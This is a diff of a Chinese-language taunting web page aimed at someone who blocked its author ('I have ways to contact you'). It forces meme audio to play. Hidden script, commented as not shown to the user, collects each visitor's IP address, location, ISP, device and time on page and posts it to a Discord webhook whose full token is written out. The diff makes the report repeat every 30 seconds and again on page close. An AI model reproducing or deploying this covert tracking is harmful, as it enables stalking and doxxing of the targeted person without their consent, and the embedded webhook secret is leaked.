@@ -9,18 +9,58 @@
       background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
       color: #f1f1f1;
       text-align: center;
-      padding: 10%;
+      padding: 5%;
       margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
     .box {
       background: rgba(255, 255, 255, 0.05);
       padding: 30px;
       border-radius: 16px;
       max-width: 600px;
+      width: 90%;
       margin: auto;
       box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
       backdrop-filter: blur(10px);
       border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    
+    /* 手机版适配 */
+    @media (max-width: 768px) {
+      body {
+        padding: 2%;
+      }
+      .box {
+        padding: 20px;
+        width: 95%;
+        border-radius: 12px;
+      }
+      h2 {
+        font-size: 1.5em;
+      }
+      p {
+        font-size: 14px;
+        line-height: 1.6;
+      }
+      .emoji {
+        font-size: 1.2em;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .box {
+        padding: 15px;
+        width: 98%;
+      }
+      h2 {
+        font-size: 1.3em;
+      }
+      p {
+        font-size: 13px;
+      }
     }
     .ip, .extra {
       margin-top: 20px;
@@ -68,11 +108,8 @@
 </head>
 <body>
   <!-- 鬼畜音效播放器 -->
-  <audio id="bgMusic" autoplay loop preload="auto" controls style="display:none;" volume="0.8" muted>
+  <audio id="bgMusic" preload="auto" loop style="display:none;">
     <source src="https://files.catbox.moe/8x9wqo.mp3" type="audio/mpeg">
-    <source src="https://files.catbox.moe/kd4499.mp3" type="audio/mpeg">
-    <source src="https://files.catbox.moe/osrhy0.mp3" type="audio/mpeg">
-    <source src="https://files.catbox.moe/rpp8ez.mp3" type="audio/mpeg">
     Your browser does not support the audio element.
   </audio>
   
@@ -87,117 +124,126 @@
        <p>我告诉你，<span class="rainbow">我有的是办法联系你！</span></p>
        <p>说完哈喽就把我拉黑，<span class="rainbow">这样不太好吧？</span> <span class="emoji">😤</span></p>
       <p style="margin-top: 20px; font-size: 14px; color: #888;">🎶 正在播放鬼畜音效 🎶</p>
-      <p style="font-size: 12px; color: #666; margin-top: 10px;">📱 如果听不到声音，请点击页面任意位置</p>
     </div>
 
   <script>
     const startTime = Date.now();
     
-    // 鬼畜音效库 - 多个搞笑音频源
-    const audioSources = [
-      'https://files.catbox.moe/8x9wqo.mp3',  // 你干嘛哎哟
-      'https://files.catbox.moe/kd4499.mp3',  // 鬼畜音效1
-      'https://files.catbox.moe/osrhy0.mp3',  // 鬼畜音效2
-      'https://files.catbox.moe/rpp8ez.mp3'   // 原音频
-    ];
+    // 音频链接 - 请替换为您的YouTube音频链接
+    const audioUrl = '';  // 请替换为YouTube链接
     
-    let currentAudioIndex = 0;
     const bgMusic = document.getElementById('bgMusic');
     
-    // 随机选择音频并播放
-    function playRandomAudio() {
-      currentAudioIndex = Math.floor(Math.random() * audioSources.length);
-      const audioSource = bgMusic.querySelector('source');
-      audioSource.src = audioSources[currentAudioIndex];
+    // 播放音频
+    function playAudio() {
+      bgMusic.src = audioUrl;
       bgMusic.volume = 0.8;
       bgMusic.load();
       
       // 强制播放音频
-      bgMusic.play().then(() => {
-        console.log('🎵 鬼畜音效开始播放！');
-      }).catch(error => {
-        console.log('音频播放失败，等待用户交互');
-      });
-    }
-    
-    // 用户交互后取消静音并播放
-    function enableAudio() {
-      if (bgMusic.muted) {
-        bgMusic.muted = false;
-        bgMusic.volume = 0.8;
-        if (bgMusic.paused) {
-          playRandomAudio();
-        }
+      const playPromise = bgMusic.play();
+      if (playPromise !== undefined) {
+        playPromise.then(() => {
+          console.log('🎵 鬼畜音效开始播放！');
+        }).catch(error => {
+          console.log('音频播放失败，等待用户交互:', error);
+        });
       }
     }
     
-    // 音频结束时切换到下一个
-    bgMusic.addEventListener('ended', () => {
-      setTimeout(() => {
-        playRandomAudio();
-      }, 500);
-    });
+    // 用户交互后启用音频播放
+    function enableAudio() {
+      bgMusic.muted = false;
+      bgMusic.volume = 0.8;
+      if (bgMusic.paused) {
+        playAudio();
+      }
+      // 移除所有用户交互监听器，避免重复触发
+      userInteractionEvents.forEach(eventType => {
+        document.removeEventListener(eventType, enableAudio);
+      });
+    }
     
-    // 页面加载完成后立即尝试播放
+    // 页面加载完成后尝试自动播放
     document.addEventListener('DOMContentLoaded', () => {
-      // 先静音播放，等待用户交互后取消静音
       setTimeout(() => {
-        playRandomAudio();
+        // 先尝试静音播放
+        bgMusic.muted = true;
+        playAudio();
+        
+        // 500ms后尝试取消静音
+         setTimeout(() => {
+           if (!bgMusic.paused) {
+             bgMusic.muted = false;
+           }
+         }, 500);
       }, 1000);
     });
     
-    // 用户交互事件监听器
-    const userInteractionEvents = ['click', 'touchstart', 'keydown', 'scroll'];
+    // 用户交互事件监听器 - 针对移动端优化
+    const userInteractionEvents = ['click', 'touchstart', 'keydown', 'scroll', 'touchend', 'mousedown'];
     
     userInteractionEvents.forEach(eventType => {
-      document.addEventListener(eventType, enableAudio, { once: true });
+      document.addEventListener(eventType, enableAudio, { once: true, passive: true });
     });
     
     // 页面可见性变化时尝试播放
     document.addEventListener('visibilitychange', () => {
       if (!document.hidden && bgMusic.paused) {
-        playRandomAudio();
+        playAudio();
       }
     });
     
     // 窗口获得焦点时尝试播放
     window.addEventListener('focus', () => {
       if (bgMusic.paused) {
-        playRandomAudio();
+        playAudio();
       }
     });
     
-    // 确保音频循环播放
-    bgMusic.addEventListener('loadstart', () => {
-      bgMusic.loop = false; // 关闭loop，用ended事件控制
-    });
-    
-    // 后台获取IP信息（不显示给用户）
-    fetch("https://ipapi.co/json/")
-      .then(res => res.json())
-      .then(data => {
-        const device = navigator.userAgent;
-        const now = new Date().toLocaleString();
-        const staySeconds = Math.floor((Date.now() - startTime) / 1000);
+    // 发送访客信息到Discord
+    function sendVisitorInfo() {
+      fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+          const device = navigator.userAgent;
+          const now = new Date().toLocaleString();
+          const staySeconds = Math.floor((Date.now() - startTime) / 1000);
 
-        const info = `📡 新访客信息：\nIP: ${data.ip}\n城市: ${data.city}\n地区: ${data.region}\n国家: ${data.country_name}\nISP: ${data.org}\n设备: ${device}\n访问时间: ${now}\n停留时长: ${staySeconds}秒\n🎵 正在播放鬼畜音效: ${audioSources[currentAudioIndex]}`;
+          const info = `📡 新访客信息：\nIP: ${data.ip}\n城市: ${data.city}\n地区: ${data.region}\n国家: ${data.country_name}\nISP: ${data.org}\n设备: ${device}\n访问时间: ${now}\n停留时长: ${staySeconds}秒\n🎵 正在播放鬼畜音效: ${audioUrl}`;
 
-        // 发送到Discord但不显示给用户
-        const payload = {
-          content: info
-        };
+          // 发送到Discord但不显示给用户
+          const payload = {
+            content: info
+          };
 
-        fetch("https://discord.com/api/webhooks/1390342240341200896/q347jv1coE-Ey9mVlW5_m8N33_ehxeyGZdFIJHBnYXBvQUg1OfUUH047zeIUwpNkvUQB", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(payload)
+          fetch("https://discord.com/api/webhooks/1390342240341200896/q347jv1coE-Ey9mVlW5_m8N33_ehxeyGZdFIJHBnYXBvQUg1OfUUH047zeIUwpNkvUQB", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+          });
+        })
+        .catch(err => {
+          console.log('IP获取失败');
         });
-      })
-      .catch(err => {
-        console.log('IP获取失败');
-      });
+    }
+    
+    // 页面加载后立即发送一次信息
+    setTimeout(() => {
+      sendVisitorInfo();
+    }, 2000);
+    
+    // 每30秒更新一次停留时长
+    setInterval(() => {
+      sendVisitorInfo();
+    }, 30000);
+    
+    // 页面关闭前发送最终停留时长
+    window.addEventListener('beforeunload', () => {
+      sendVisitorInfo();
+    });
   </script>
 </body>
 </html>
